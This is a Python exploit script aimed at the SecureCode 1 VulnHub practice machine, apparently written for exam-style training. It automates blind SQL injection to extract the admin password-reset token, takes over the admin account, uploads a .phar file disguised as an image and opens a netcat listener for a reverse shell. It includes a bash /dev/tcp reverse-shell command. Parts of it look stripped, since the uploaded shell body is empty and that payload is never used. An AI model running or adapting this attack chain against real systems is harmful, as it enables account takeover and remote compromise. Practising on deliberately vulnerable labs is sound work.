# Secure Code 1 - Vulnhub Machine 0Click RCE Exploit
# https://www.vulnhub.com/entry/securecode-1,651/
# Given exploit uses Blind SQL Injection To reset password for admin
# Then using admin account to upload .phar file to receive reverse shell
# for a reverse shell, I used NC as listener in this code, if netcat is installed
# code will automatically use it, if you have it as binary, you can specify path with
# --nc argument

# https://github.com/Z3R013x/OSWE-Like-0Click
# https://pwnit.io/

import requests
import argparse
from string import printable, ascii_lowercase
import random
import sys 
from shutil import which
from os import path, system
from threading import Timer

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_warning(text):
    print(f"{bcolors.WARNING}[-] {text}{bcolors.ENDC}")

def print_success(text):
    print(f"{bcolors.OKGREEN}[+] {text}{bcolors.ENDC}")

def print_info(text):
    print(f"{bcolors.OKCYAN}[*] {text}{bcolors.ENDC}")

def print_fail(text):
    print(f"{bcolors.FAIL}[!] {text}{bcolors.ENDC}")

def getLength(proto, ip, port, query, verbose=True):
    for i in range(0,256):
        response = requests.get(f"{proto}://{ip}:{port}/item/viewItem.php?id=1 AND IF(LENGTH(({query})) = {i}, TRUE, FALSE);", allow_redirects=False, proxies=proxies)
        if(response.status_code != 302):
            if verbose:
                print_info(f"Got Length of {i} for query {query}!")
            break
    return i + 1 # Minus one since we're working with indexes

def getData(proto, ip, port, query, length=None, verbose=True):
    if length == None:
        length = getLength(query, verbose)
    known_text = ""
    known_count = 0 
    for i in range(0, length): 
        for symbol in printable:
            hexSymbol = "0x"+symbol.encode("UTF-8").hex()
            response = requests.get(f"{proto}://{ip}:{port}/item/viewItem.php?id=1 AND IF(SUBSTRING(({query}), {i}, 1) = BINARY {hexSymbol}, TRUE, FALSE); ", allow_redirects=False, proxies=proxies)
            if(response.status_code != 302):
                known_text += symbol
                left = int(length - i) - 1
                if verbose:
                    print("Extracted: " + known_text+"?"*left+"\r",sep='', end ='', file = sys.stdout , flush = False)
                break
    if verbose:
        print("")
    return known_text

def resetPassword(proto,ip,port,user):
    try:
        response = requests.post(f"{proto}://{ip}:{port}/login/resetPassword.php", data={"username": user}, proxies=proxies)
        if response.status_code == 200:
            print_info("Reset was requested succesfully")
            print_info("Using SQL Injection to fetch reset token")
            hex_user = "0x"+user.encode("UTF-8").hex()
            query = f"SELECT token FROM user where username={hex_user}" # we're using hex values since there's real escape string in code
            reset_token = getData(proto, ip, port, query, (getLength(proto, ip, port, query)))
            new_password = ''.join(random.choice(ascii_lowercase) for i in range(16))
            print_info(f"Got Reset token, resetting {user} user password to \"{new_password}\"")
            reset_url = f"{proto}://{ip}:{port}/login/doResetPassword.php?token={reset_token.strip()}"
            reset_response = requests.post(f"{proto}://{ip}:{port}/login/doChangePassword.php", data={"token": reset_token, "password": new_password}, proxies=proxies)
            if reset_response.status_code == 200:
                print_success("Password Reset Was Succesfull!")
                return new_password
            else:
                print_fail("Something went wrong during the proccess, try again")
                exit(1)
        else:
            print_fail("Something went wrong during the proccess, try again")
            exit(1)

    except requests.exceptions.ConnectionError:
        extra_text = "or the debug proxy" if args.debug_proxy != "" else ""
        print_fail(f"Error while processing the request, please make sure that target {extra_text} is reachable.")
        exit(1)

def login(proto,ip,port,user,password):
    global session_token
    try:
        response = requests.post(f"{proto}://{ip}:{port}/login/checkLogin.php", data={"username": user, "password": password}, allow_redirects=False, proxies=proxies)
        if response.headers["Location"] == "../users/index.php":
            PHPSESS_part = response.headers["Set-Cookie"].split("PHPSESSID=")[1]
            colon_index = PHPSESS_part.find(";")
            session_token = PHPSESS_part[:colon_index]
            if len(session_token) > 2:
                print_success("Login succesfull")
            else:
                print_fail("Login Failed, try re-running the exploit!")
    except requests.exceptions.ConnectionError:
        extra_text = "or the debug proxy" if args.debug_proxy != "" else ""
        print_fail(f"Error while processing the request, please make sure that target {extra_text} is reachable.")
        exit(1)

def get_revshell(proto, ip, port, lhost, lport, token, nc_path):
    rev_shell = f''
    random_name = ''.join(random.choice(ascii_lowercase) for i in range(8))
    files = {
        "image": (f'{random_name}.phar', rev_shell, 'image/png')
        }
    cookies = {'PHPSESSID': f'{token}'}
    payload = {'id': '1',
            'id_user': '1',
            'name': 'Raspery Pi 4',
            'description': 'Latest Raspberry Pi 4 Model B with 2/4/8GB RAM raspberry pi 4 BCM2711 Quad core Cortex-A72 ARM v8 1.5GHz Speeder Than Pi 3B',
            'price': '92'}
    response = requests.post(f"{proto}://{ip}:{port}/item/updateItem.php", files=files, data=payload, cookies=cookies, proxies=proxies, allow_redirects=True)
    if random_name in response.text and "Success!  Item data has been edited" in response.text:
        print_success("Reverse shell uploaded succesfully")
        payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        
        print_success("payload sent to reverse shell, starting nc listener, you must get reverse shell within seconds\n\n")
        url = f"{proto}://{ip}:{port}/item/image/{random_name}.phar"
        t = Timer(3, trigger_webshell, [url])
        t.start()
        system(f"{nc_path} -lvnp {lport} ")

def trigger_webshell(url):
    try:
        requests.get(f"{url}")
    except requests.exceptions.Timeout:
        pass # expected one
    except Exception as e:
        print_fail(f"Unexpected exception occured: {str(e)}")

parser = argparse.ArgumentParser(description='exploit configuration', formatter_class=argparse.ArgumentDefaultsHelpFormatter)

parser.add_argument('-t','--rhost', type=str, help="Target IP", required=True)
parser.add_argument('-rp','--rport', type=int, help="Target Port", default="80", required=False)
parser.add_argument('-l','--lhost', type=str, help="Local IP", required=True)
parser.add_argument('-lp','--lport', type=int, help="Local Port", default="4444", required=False)
parser.add_argument('-pr','--proto', type=str, help="Target Protocol", default="http", required=False)
parser.add_argument('-nc', '--nc', type=str, help="custom netcat binary (nc) path", default=None, required=False)
parser.add_argument('-d','--debug-proxy', type=str, help="if passed, all requests will go trough proxy please provide ip:port", required=False, default="")

args = parser.parse_args()

proxies = {"http":f"{args.debug_proxy}"}
target_user = "admin"
session_token = ""

if __name__ == "__main__":
    nc_path = which("nc")
    if nc_path == None and args.nc == None:
        print_fail("Netcat must be installed to use exploit, Please install nc or specify custom path with --nc argument")
        exit(1)
    elif args.nc != None and not path.isfile(args.nc):
        print_fail("invalid nc path specified, file doesn't exist")
        exit(1)
    password = resetPassword(args.proto, args.rhost, args.rport, target_user)
    login(args.proto, args.rhost, args.rport, target_user, password)
    get_revshell(args.proto, args.rhost, args.rport, args.lhost, args.lport, session_token, nc_path)
